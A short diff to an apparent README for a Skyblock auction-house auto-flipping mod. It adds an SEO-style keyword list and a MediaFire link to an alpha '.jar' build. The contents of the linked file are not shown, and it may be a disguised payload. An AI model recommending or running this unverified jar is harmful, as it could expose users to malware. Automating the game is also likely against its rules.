@@ -16,3 +16,5 @@ happy flipping :)
 
 Flipping, skyblock, cofl, nec, coins, flipper, auto, auction house, ah, flip, automatic, mod
 
+download: https://www.mediafire.com/file/66u0bfyhyy05wqa/SkyCofl-1.5.6-alpha.jar/file 
+
